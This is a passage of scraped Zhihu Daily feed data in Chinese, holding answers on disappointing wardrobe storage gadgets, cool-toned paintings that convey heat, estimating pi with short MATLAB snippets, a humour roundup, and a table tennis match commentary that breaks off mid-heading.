alt=\"\"></figure><p>说到鞋架，不得不提一嘴这个同样难用的立式鞋架，看图片的时候真的心动，一次性放下三双鞋子。当你买回家的时候你就会发现，男装鞋和高帮鞋放不下。</p>\n<p>当你终于找到尺寸对的鞋子支起来，取出一对鞋子的时候，其他鞋子也跟着倒下来，真的欲哭无泪……</p>\n<p>而且这个鞋架根本塞不进一般的鞋柜，除非你家鞋柜的层高有 30cm 以上，不然就别考虑了。</p>\n<p><strong><em><strong>NO.3 双层鞋托架</strong></em></strong></p>\n<p>你以为是这样的：</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-2081c2b0ba38ba6b6e669f8bd2db1c18_720w.jpg?source=8673f162\" alt=\"\"></figure><p>实际上是这样的：</p>\n<figure><img src=\"https://pica.zhimg.com/v2-f88d06095195a9da6b33c051b23592a3_720w.jpg?source=8673f162\" alt=\"\"></figure><p>虽然能放得下平底鞋，但是它依旧放不下高帮鞋、高跟鞋、以及男士鞋，而且你家的鞋柜要足够高才能像上图一样放得下两双鞋子，不实用。</p>\n<p><strong><strong><em>NO.4 S 型裤架</em></strong></strong></p>\n<p>你以为是这样的：</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-767c60a15ee836c0b40d4113ffd01c72_720w.jpg?source=8673f162\" alt=\"\"></figure><p>实际上是这样的：</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-c091e9b351ce016b85ab787328732d19_720w.jpg?source=8673f162\" alt=\"\"></figure><p>S 型裤架，官方声称一个裤架能收纳五条裤子，看起来真的美滋滋。</p>\n<p>当我怀揣着美好的幻想尝试把五条裤子放进裤架时，再一次留下悔恨的泪水。</p>\n<p>这裤架根本顶多能塞进三条裤子，如果你的裤子稍微厚实一些，根本放不下好吗！ 说好的方便收纳呢？怒摔！</p>\n<p>而且每次拿取中间的裤子时，其余几条都会被扯出来，然后你就得逐条整理。</p>\n<p>这到底是什么“神仙”鸡肋玩意儿？</p>\n<p><strong><strong><em>NO.5 九孔衣架 </em></strong></strong></p>\n<p>你以为是这样的：</p>\n<figure><img src=\"https://pica.zhimg.com/v2-5a0c9130447e2346911151fe61d8f199_720w.jpg?source=8673f162\" alt=\"\"></figure><p>实际上是这样的：</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-cee205a3b68cc7507b9f110f9e4cd93b_720w.jpg?source=8673f162\" alt=\"\"></figure><p>这个九孔衣架也是衣架中的垃圾战斗机。</p>\n<p>看图以为它一个顶九个，实际它连一个都不如，别问我怎么知道的。</p>\n<p>冬天厚重的衣服放不了几件，只能放薄如衬衣的衣服。 然而最后你就会发现它跟正常挂放所占的位置是一样的，那买它回来干嘛？ 而且每次拿取衣服都要把整个衣架拿出来，麻烦又费力，还歪在一边，一点儿都不美观！</p>\n<p><strong><strong><em>NO.6 折衣板</em></strong></strong></p>\n<p>你以为是这样的：</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-7226bce66cd40ad4cf1e98fa2c658518_720w.jpg?source=8673f162\" alt=\"\"></figure><p>实际上是这样的：</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-b83df95e61f6aab6ea24348e6293fe73_720w.jpg?source=8673f162\" alt=\"\"></figure><p>折衣板，美其名曰能帮你快速叠好衣服，一板一衣。实际上很鸡肋，把衣服放在板子上叠好，还用丝带包住竖放？ 浪费空间且极其不便利。</p>\n<p>而且稍微厚实一点的衣服（如卫衣、外套）根本不适用呀。一旦叠放厚衣服就东倒西歪了，还不如挂起来或者简单叠放好使呢。</p>\n<p><strong><em><strong>NO.7 包包收纳袋</strong></em></strong></p>\n<p>你以为是这样的：</p>\n<figure><img src=\"https://pica.zhimg.com/v2-c5881a62840c10fdb40f1e8cc8f00a98_720w.jpg?source=8673f162\" alt=\"\"></figure><p>实际上是这样的：</p>\n<figure><img src=\"https://pica.zhimg.com/v2-e324c88fd6e7564a9bcdaf62dbd109ea_720w.jpg?source=8673f162\" alt=\"\"></figure><p>当我看到详情页图片时，以为家里那无处安放的包包终于有了好归宿。然而，用了一段时间后发现它不仅占地儿，还把包包挤到变形。</p>\n<p>而且也不是什么包包都能放得下，稍微大一点的包包也只能放在一边，那买它回来的意义是啥？</p>\n<p><strong><em><strong>NO.8 蜂窝式整理格</strong></em></strong></p>\n<p>你以为是这样的：</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-3617e9c3bcc558890596f59d541ffaf8_720w.jpg?source=8673f162\" alt=\"\"></figure><p>实际上是这样的：</p>\n<figure><img src=\"https://pica.zhimg.com/v2-299cf7f59a0349d7e45047e1d6c22a3e_720w.jpg?source=8673f162\" alt=\"\"></figure><p>咦，这不就是传说中收纳内裤和袜子的神器吗？</p>\n<p>我用血泪史告诉你，一！点！都！不！好！用！首先，它不一定适合你家的抽屉尺寸，组装麻烦。 当然了，最鸡肋的还是它收纳有限，要么放不下一双袜子，那就放一只袜子或一条内裤吧，然后你就发现它远没有之前收纳得多呀。</p>\n<p><strong><em><strong>NO.9 圆圈围巾衣架</strong></em></strong></p>\n<p>你以为是这样的：</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-b97034ca4a1d13c22958349b989519ec_720w.jpg?source=8673f162\" alt=\"\"></figure><p>实际上是这样的：</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-9d13fae6974a585f46fc78d43527e8cb_720w.jpg?source=8673f162\" alt=\"\"></figure><p>这个围巾收纳衣架的鸡肋程度和 S 型衣架是不相上下的，首先并不是每个人都有那么多围巾需要收纳，当你塞满的时候，不美观，还拿取不方便，而且还占地方。</p>\n<p><strong><em><strong>NO.10 衣柜分层搁板</strong></em></strong></p>\n<p>你以为是这样的：</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-77c1d4a02faaffd11cadcc6ac1f45cd2_720w.jpg?source=8673f162\" alt=\"\"></figure><p>实际上是这样的：</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-edef82b6aeb129ed09cebb92ea27bc84_720w.jpg?source=8673f162\" alt=\"\"></figure><p>我本来以为这个衣柜分隔板起码会比九孔衣架、S 型衣架好用些，然而并没有。</p>\n<p>虽然它能分隔空间，尽可能地利用好空间。 但如果你放比较重的物品，它就很有可能会塌下来，别问我是怎么知道的。</p>\n<p>不知道你家中招了没，反正我对这些所谓的收纳神器真的累爱不觉，其实很多都是所谓的网红家居博主吹嘘出来，商家变着花样玩的噱头。</p>\n<p>任何不为方便实用服务的“家居神器”都是耍流氓呀。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/57401740\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738924"},{"title":"在绘画中是否有办法用冷色调来表现炽热感的画面，例如沙漠等？","date":"2021-08-05 23:08:33","description":"<div>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/v2-dad61e25d1df1ff887178b98f766504b_l.jpg?source=8673f162\"><span>Scotty，</span><span>我总能找到些被忽视的珍珠</span>\n<a href=\"https://www.zhihu.com/question/454066577/answer/1829685929\" hidden>阅读原文</a>\n</div>\n<div>\n<p>谢邀，说句老实话，这题问得好刁钻，我尽量答吧，</p>\n<p>我的思路是从我自己积累的图库中搜索色调关键词（我自己分类好的），</p>\n<p>然后从“冷调”和“炽热感”这两个角度入手，</p>\n<p>看看有没有接近或者勉强符合这道题的作品：</p>\n<p><strong><strong>1.作者 Maja Wronska 在冷调中加入点状、线状的暖色</strong></strong></p>\n<p>这个能不能算冷调都两说，这个思路算是勉强切题吧。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-dfe36fa76e0027a498d968a1045405fa_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>2.作者 John Miller 暗示和营造出一股压迫视觉的炙热夏天</strong></p>\n<p>这个我觉得比较厉害，你能透过画面想象到这是一个沉闷到不行的夏日海滩，能感受到一股压抑的热浪；</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-5abc64ef7b31da02f846e04aa698ac62_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pica.zhimg.com/v2-70130e88e469c1d491ac32cadcd2470e_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>3.作者 Joaquín Sorolla 冷调海滩</strong></p>\n<p>西班牙的印象派画家，用冷调去烘托海滩的光线，让你回忆起海边的日晒</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-e7886aec6b80d47007e36b2b9783213d_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-f2433a4a6c2b70324d20d709a2982e25_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-25ca68d98b468850d7fdd97f9b805c44_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>4.作者 Nicholas Roerich 沙漠风景</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-519969509a1118079d1103efc37a60ff_720w.jpg?source=8673f162\" alt=\"\"></figure><p>题主说例如沙漠，这是我能找到的冷调中最暖的沙漠了....</p>\n<p><strong>5.Bato Bugarzhapov 和 Peter Bezrukov 的风景色彩，刺眼的光</strong></p>\n<p>用光去营造炽热感，描绘出那种刺眼的感受</p>\n<p>Bato Bugarzhapov：</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-ae7615c89af574cc9d36ab76bf531c99_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-0955483cec127cd49f7fa9624b4b1e71_720w.jpg?source=8673f162\" alt=\"\"></figure><p>Peter Bezrukov：</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-300c1402fa13000fcc9b83ffabaebc33_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-af41009bdb2c454e4053fb5db711ecdc_720w.jpg?source=8673f162\" alt=\"\"></figure><p>下面四幅也是靠光感来营造出的感受：</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-241416fae571b27cd6e9939103a9224d_720w.jpg?source=8673f162\" alt=\"\"><figcaption>作者不详</figcaption></figure><figure><img src=\"https://pic2.zhimg.com/v2-9bf5a746ba515f4de61c203123b18b90_720w.jpg?source=8673f162\" alt=\"\"><figcaption>作者不详</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-b98d4566b425cfe0f8db74afe07ba2fb_720w.jpg?source=8673f162\" alt=\"\"><figcaption>作者不详</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-47973557a977937f43b6a90d21c228a8_720w.jpg?source=8673f162\" alt=\"\"><figcaption>作者不详</figcaption></figure><p><strong> </strong><strong>6.作者 Hiroshi Matsumoto 热抽象</strong></p>\n<p>这种炽热有点精神层面了，它是由画面视觉暗示出作者的作画状态，你可以感受出作者作画时的一股不安和激情，我个人认为这也算一种炽热感；</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-0b35becaed12ba8852c28b14a79de929_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-e3fd3f66a4402913165192c86b8c907c_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>7.作者 Allan P Friedlander 的荷塘 和作者 Aaron Morse 的插画</strong></p>\n<p>这二者的思路跟第一幅的 Maja Wronska 很类似，但不同的地方在于局部的暖色使用的非常美妙考究；</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-192e53ac081ab686af801ab6485f2ecc_720w.jpg?source=8673f162\" alt=\"\"></figure><p>Aaron Morse 的插画也有色调不统一的问题，所有也有点不切题：</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-fcaf6f2e852711fdc3822e1f90028b1b_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-135eebc9395f3d9867c04a705e419c81_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>8.作者 Rikka Ayasaki 的天空</strong></p>\n<p>Rikka Ayasaki 这位女画家很喜欢绘制天空，她笔下的天空都是丰富且炽烈的色彩，这是一张为数不多的雷雨天；</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-ed21014edcfec2ed7fe2b4ed593dc94e_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>9.作者 Criss Canning 的静物</strong></p>\n<p>Criss Canning 的静物非常喜欢构成感推敲，在静物的摆放上有一股极致的理性，但是在边缘线和绘画的笔触上，她太像梵高了，这是一股耐心且冲动的细腻，如果你能放大看到她的笔触，你就能感受到一颗炽烈的心；</p>\n<figure><img src=\"https://pica.zhimg.com/v2-4a6ae02778424f1765aad390653057bc_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>10.作者不详，笔触营造</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-4b3e1113b0af89e78068359a155af0fe_720w.jpg?source=8673f162\" alt=\"\"></figure><p>这道题其实我自己答得不是很满意，有不同的意见欢迎在评论区指正和讨论；</p>\n<hr>\n<p>最近我把我这几年在知乎写的一点关于绘画、艺术的干货做了个汇总，大家有需求的欢迎去看看。</p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/98208948\">Scotty：连点绘面：近年来写的绘画、艺术干货汇总 持续更新</a></p>\n<p><strong>以上</strong></p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/454066577\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738894"},{"title":"能不能绕过π，来计算一个圆的面积?","date":"2021-08-05 23:08:24","description":"<div>\n<div>\n<div>\n<img src=\"https://pic3.zhimg.com/v2-b777a1806756262d6c6f3c00adbd2be9_l.jpg?source=8673f162\"><span>Mr.Bo，</span><span>爱好科技，航天迷一枚，工科研究僧</span>\n<a href=\"https://www.zhihu.com/question/475969249/answer/2038378398\" hidden>阅读原文</a>\n</div>\n<div>\n<p>这个问题其实也等价于在计算机中如何表示</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Cpi\" alt=\"\"></p>\n<p>，对于半径为 1 的单位圆来说，它的面积就是</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Cpi\" alt=\"\"></p>\n<p>。</p>\n<p>那么估计单位圆的面积就转换为了估计</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Cpi\" alt=\"\"></p>\n<p>，那么先缩小本问题的目标，如何计算单位圆的面积？</p>\n<p>（1）最基础的方法就是使用几何概率，即蒙特卡罗方法：</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-21dc2249d90b689df99f49acd55d50a4_720w.jpg?source=8673f162\" alt=\"\"></figure><p>即撒点，假设向正方形中均匀撒入 n 个点，共有 m 个点落入圆中，那么落入圆中点的概率就为：</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5C%5C+%5Cfrac%7BS_%E5%9C%86%7D%7BS_%7B%E6%AD%A3%E6%96%B9%E5%BD%A2%7D%7D%3D%5Cfrac%7Bn%7D%7Bm%7D\" alt=\"\"></p>\n<p>这样很容易就得到了圆的面积为</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Cfrac%7Bn%7D%7Bm%7D%7BS_%7B%E6%AD%A3%E6%96%B9%E5%BD%A2%7D%7D\" alt=\"\"></p>\n<p>，发现没有，成功绕开了</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Cpi\" alt=\"\"></p>\n<p>算出了圆的面积，并且在单位圆情况下能够成功估计</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Cpi\" alt=\"\"></p>\n<p>，对于概率来说，实验次数越多越准，也就意味着撒点数量越多，圆的面积越精准，也意味着</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Cpi\" alt=\"\"></p>\n<p>的精度越高。</p>\n<p>（2）第二种方法，就是离散，这是非常重要的思想</p>\n<p>首先就是微积分的思想，即将圆面积拆分成很多微小面积之和，通过对微小面积求和来逼近真实面积。很典型的例子就是将正方形划分为一个一个的小正方形格子，统计落在圆内的所有正方形小格子的比例。高赞回答举得一系列例子，其实也就是这个思想的体现。在高中其实就已经讲过，曲边梯形面积的求法，这就是微积分最核心的思想，无论理论多么高大上，理论基础都是这个：化曲为直，无限逼近。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-06c901e2fd8cf87889e83a28861296e5_720w.jpg?source=8673f162\" alt=\"\"><figcaption>图源百度</figcaption></figure><p>其次就是级数的思想，即将对单位圆面积的求解划分为一小块一小块面积的总和，很典型的一个级数就是：</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5C%5C+%5Csum_%7Bn%3D1%7D%5E%7B%5Cinfty%7D%7B%5Cfrac%7B1%7D%7Bn%5E2%7D%7D%3D%5Cfrac%7B%5Cpi%5E2%7D%7B6%7D%3D%5Cfrac%7BS_%7B%E5%8D%95%E4%BD%8D%E5%9C%86%7D%5E2%7D%7B6%7D\" alt=\"\"></p>\n<p>包括传统的割圆法等等，体现的核心思想就是两个字：<strong>逼近，</strong>无非就在于逼近的精度如何罢了。</p>\n<p>在完成单位圆面积的估算之后，其他所有圆的面积，无非就是单位圆面积的倍数了，这仅仅与圆的直径 / 半径比值相关，那么就简单通过直尺来得到圆的面积，绕开了</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Cpi\" alt=\"\"></p>\n<p>。</p>\n<p>在实际使用中，根据所需的精度对</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Cpi\" alt=\"\"></p>\n<p>进行估计即可，比如 c 语言的 math 库函数里直接对</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Cpi\" alt=\"\"></p>\n<p>值定义，也算典型的直接拿来用（狗头）</p>\n<div><code>#if defined(_USE_MATH_DEFINES) &amp;&amp; !defined(_MATH_DEFINES_DEFINED) #define _MATH_DEFINES_DEFINED #define M_E 2.71828182845904523536 #define M_LOG2E 1.44269504088896340736 #define M_LOG10E 0.434294481903251827651 #define M_LN2 0.693147180559945309417 #define M_LN10 2.30258509299404568402 #define M_PI 3.14159265358979323846 #define M_PI_2 1.57079632679489661923 #define M_PI_4 0.785398163397448309616 #define M_1_PI 0.318309886183790671538 #define M_2_PI 0.636619772367581343076 #define M_2_SQRTPI 1.12837916709551257390 #define M_SQRT2 1.41421356237309504880 #define M_SQRT1_2 0.707106781186547524401 #endif /* _USE_MATH_DEFINES */ </code></div>\n<p>那么蒙特卡罗方法的精度如何？写个代码便知：</p>\n<div><code>sample_points = 10.^(2:1:8); estimate_pi = zeros(length(sample_points),1); for i = 1:length(sample_points) n= sample_points(i); x = rand(n,1); rng('shuffle'); y = rand(n,1); rng('shuffle'); s = sum(x.^2+y.^2 &lt;= 1); estimate_pi(i) = s/n*4; end err=abs(estimate_pi-pi) plot(err,'r','LineWidth',1); xlabel('取值点（10^x）'); ylabel('估计误差'); </code></div>\n<p>下图展示了在</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=10%5E8\" alt=\"\"></p>\n<p>点的情况下，估计值为 3.14123220000000，这显然与真实值差距较大，当然这是由于 MATLAB 的随机函数不是真随机导致的，但是蒙特卡罗方法是随机策略，每次运行的值都不同，因此很少在计算机中使用，常用的方法一般为<strong>数值积分</strong>方法。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-2295963df45c862c4fe7ee9853cd5db9_720w.jpg?source=8673f162\" alt=\"\"></figure><p>再用级数</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Csum_%7Bn%3D1%7D%5E%7B%5Cinfty%7D%7B%5Cfrac%7B1%7D%7Bn%5E2%7D%7D%3D%5Cfrac%7B%5Cpi%5E2%7D%7B6%7D\" alt=\"\"></p>\n<p>来试试，代码为：</p>\n<div><code>n=1000; y=0; num=0; for i=1:1:n num=num+(1/(i*i)); end pi=sqrt(6*num); disp(pi) </code></div>\n<p>结果为 3.140638056205995，依旧不太理想。</p>\n<p>如果采用对</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Cint%5Cfrac%7B1%7D%7B1%2Bx%5E2%7Ddx\" alt=\"\"></p>\n<p>进行数值积分，代码为：</p>\n<div><code>a=0;b=1;s=0;n=1000;i=0; h=(b-a)/n; for i=0:n-1 xi=a+i*h; yi=1/(1+(xi)^2); xj=a+(i+1)*h; yj=1/(1+(xj)^2); s=s+(yi+yj)*h/2; end estimate_pi=vpa(4*s,30); </code></div>\n<p>那么可以得到</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Cpi\" alt=\"\"></p>\n<p>为 3.141592486923，显然精度已经很高了.</p>\n<p>如果还想要更高的精度，就需要迭代速度更快，收敛速度更快的方法，感兴趣可以去查一下，在这里就不再过多赘述了。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/475969249\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738904"},{"title":"瞎扯 · 如何正确地吐槽","date":"2021-08-05 23:08:15","description":"\n<div>\n<h2>作为医学生你经历过最囧的事是什么？</h2>\n<div>\n<div>\n<img src=\"https://pic3.zhimg.com/v2-9b101141b2c41745b7bd1ad4eb487ef1_l.jpg?source=8673f162\"><span>Sarah，</span><span>中度分裂的双子座女神经。</span>\n<a href=\"https://www.zhihu.com/question/302836305/answer/565723073\" hidden>阅读原文</a>\n</div>\n<div>\n<p> </p>\n<p>听诊器听心音，咦？ 咋没声音？ 换个地方，咦，还是没有？再换，啊？还是没有啊。。。</p>\n<p>不会是右位心吧？</p>\n<p>正准备把听诊器胸件移到右边，就听到病人悠悠地说：</p>\n<p>大夫，你没把听诊器挂耳朵上啊？</p>\n<p>……</p>\n<p> </p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/302836305\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>男朋友嫌弃你长得丑，你会选择整形吗？</h2>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-8c25fc7ac02bc34168a4e2c554ea3273_l.jpg?source=8673f162\"><span>喃七大魔王，</span><span>整形从业者私人号，只科普，不植入，不推荐</span>\n<a href=\"https://www.zhihu.com/question/355315240/answer/893066397\" hidden>阅读原文</a>\n</div>\n<div>\n<p>男朋友嫌弃自己丑，先做的是要换个男朋友</p>\n<p>自己觉得自己丑，才需要整形</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/355315240\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>十二星座是什么样的？</h2>\n<div>\n<div>\n<img src=\"https://pica.zhimg.com/v2-2d66a0e395aacadc0f10271ab8c8f700_l.jpg?source=8673f162\"><span>鹿儿</span>\n<a href=\"https://www.zhihu.com/question/22020330/answer/814197627\" hidden>阅读原文</a>\n</div>\n<div>\n<p>都是好样的。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/22020330\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>工作一年，妈年底拿走我所有存款6万，还说结婚彩礼10万也要给她，都替我存着防止对象花我钱，什么心思？</h2>\n<div>\n<div>\n<img src=\"https://pica.zhimg.com/v2-5395d00a1972900d595133a76ec74a9b_l.jpg?source=8673f162\"><span>黄瓜蘸酱，</span><span>无业游民不装逼浑身难受</span>\n<a href=\"https://www.zhihu.com/question/313148052/answer/608704397\" hidden>阅读原文</a>\n</div>\n<div>\n<p>哎呀！你一个理财产品竟然有自己的想法了！</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/313148052\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>一般被清华北大劝退的都是什么样的学生？</h2>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/v2-6b34a9da0efa3bde2b2a47285316a5d0_l.jpg?source=8673f162\"><span>阿娜娜斯小面包</span>\n<a href=\"https://www.zhihu.com/question/270381511/answer/744411323\" hidden>阅读原文</a>\n</div>\n<div>\n<p>高中某“传奇”学长。</p>\n<p>成绩超级好，人品极其差。他的很多行为都不能用正常人的逻辑解释，是一个超级大奇葩。</p>\n<p>最有名的一个传说，是他在某废弃教室的门口撒尿，被教导主任抓了个现行。已经不是第一次了，是被主任蹲点抓住的。</p>\n<p>本来还以为他会狡辩什么的，结果人家直接跟主任说：“我能考上北大，你少管我。”</p>\n<p>教导主任气不过，把校长、年级主任、班主任啥的都叫来了。谈到最后的结果是：他确实能考上北大，随他去吧，反正以后总有人能治他。</p>\n<p>我们那小地方多少年也出不来一个清北，这个处理结果并不意外。当时那个教导主任气得不轻，但也无可奈何。</p>\n<p>然后那位学长果然考上了北大。</p>\n<p>紧接着一个月左右就被劝退了。</p>\n<p>具体原因不明。</p>\n<p>不知道是不是在人家北大的废弃教室门口撒尿了。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/270381511\">阅读原文<span></span></a></div>\n</div>\n","link":"https://daily.zhihu.com/story/9738936"},{"title":"2020 东京奥运乒乓球女团中国 3:0 完胜日本夺冠，如何评价本场比赛？","date":"2021-08-05 12:52:48","description":"\n<p><b>恭喜中国队3比0战胜日本！</b></p>\n<p>本届奥运会，中日女子选手仅在女单半决赛上交锋一次，即为经典的孙颖莎伊藤之战：</p>\n<a data-draft-node=\"block\" data-draft-type=\"link-card\" href=\"https://www.zhihu.com/answer/2026457583\" class=\"internal\">叶子盛：2020 东京奥运会乒乓球女单半决赛孙颖莎 4:0 轻取伊藤美诚，如何评价本场比赛？</a><p>中方的陈梦、孙颖莎、王曼昱三位大将，对日本大姐大伊藤的胜率均是极高的。孙颖莎更是刚刚4比0取胜，对于队友的士气是极大鼓舞。平野虽曾17年表现极其亮眼，但自从被国乒研究后，反手长下旋被盯死，后来一直便没有特别出色的战绩。然而，这是日本的主场，且国乒被其研究了许久。伊藤和平野的打法比较看状态，要防止爆发的可能。这次终于在决赛上相遇，尚有不小的悬念。希望中国队可以迅速取胜，消除任何小概率事件发生的土壤。</p>\n<hr>\n<h2>第一场 双打</h2>\n<p>第一场双打，陈梦/王曼昱对战石川/平野。伊藤留作生力军打单打了。日方上来几回合内就锁了个两个直线，对中国队的习惯、跑位是有较深的研究的。日方选手一个左手一个右手，相比中国两个右手还是有一定跑位优势。</p>\n<p>石川打得很凶，能反拉就反拉，能近台加力快带就快带。局初段我方不太适应，速度有点跟不上，再加上日本有两个运气球，比分到了局中有点落后。日本的配合、线路目前而言要比我方强上一些。</p>\n<p>第一局中后段，日方吃了两个发球。再加上我方抡出了几个质量，实力球还是比日方功底深厚，比分一度扳至八平。然而，日方的线路优势再次发挥作用，连续的正手锁直线，把中方攻得有些措手不及。之后虽我方追上一分，但其后仍被逼到远台，尝试反攻失分。</p>\n<p>我方第一局打得还是有点拘谨，起板的落点也没拉开。这样被对方一左一右调动得太被动，质量优势就显现不出来了。看看第二局换发球接发球轮以后会不会有改观，中国队也需要适应对手的时间。</p>\n<p>偶数局上来似乎中国队明显要舒服一些，平野的综合实力相比石川还是差些，中方能给出更多质量来。虽然石川0比4落后时有一个精彩的侧身爆冲，但并不能挽回下风的气势。见形势大比分落后，再加上本轮次日方限制线路的打法不奏效，接发球也出了不少问题，日本队全部搏杀（且成功率不高，因为不是计划内的战术），速败。关键还是要看第三局，现在的气势我方占优。</p>\n<p>平野的发球我们还是吃了一点的，在下一个轮次尤其要注意。不过王曼昱主要是拧拉为主，吃发球的几率不大，但是回球的落点一定要多想想。陈梦的质量也一定要出得来。</p>\n<p>第三局开始。日本基本的战术还是先锁直线/平野挑大斜线，锁住中国队的正手位，随后再调动回反手位。如此一来，由于中国队是双右手组合，就很容易挤压在一起。王曼昱接发的拧拉还是基本回在对方中路上，如果能多些变化就更好了。</p>\n<p>2比4时是中国队的好球，石川的打法还是比较拼，积极用正手时反手位露出了空当。可以多考虑从这里做文章。5比6时的那球也非常好，一定不能像前面几回合那样送中路，多给点反手，多给点重复落点。对面虽是一左一右，但武器库都不完善，想要拼中国队都需要舍近求远，还是有机会能挤压住对方空间的。</p>\n<p>七平时的回合中国队落点给得非常好，多板对拉后拿下很长气势，本可以成为关键节点，但随后日本就是一个运气球得分。笔者仍感到微微担忧，前途未卜。好在国乒二位在八平后又来了一个对拉得分，打得超出了石川的能力范围，随后一鼓作气拿下本局。</p>\n<p>第三局实在是太关键了…好在中国队成功咬了下来。接下来一定要乘胜追击拿下。有个比较有趣的事在于，陈王二位发球前的沟通，是不是应该稍微小声点…石川和平野应该都能听懂（</p>\n<p>第四局第一个回合平野的反手上手就开始加质量，石川也增强了搏杀力度。中国队有所失误，但力量占据优势，双方战至小分3比3仍是僵持状态。日方的短球还是有所欠缺的，力量也不占优，3比5落后之后叫了暂停。暂停结束后，日方挑打失误，随后又被中国队抢先上手，比分拉开了不小。本局日方的多数得分点还是在控制我方的正手上，又是连续两个锁直线送我们正手的得分了。</p>\n<p>日本5比8落后时，石川反手反拉的完美落点得分，把日本队的气势又带出来了。随后是石川的抢攻套路得分，目前中日仅一分之差。王曼昱的反手在此时发挥了极大作用，力量大，速度快，最后更是一板拧拉一击致命，抢下了第一场双打。</p>\n<p>这场双打对我们太珍贵了。孙颖莎对伊藤并非必胜，日本这次的冲击力是很大的。中国队开了个好头。</p>\n<hr>\n<h2>第二场 孙颖莎 vs 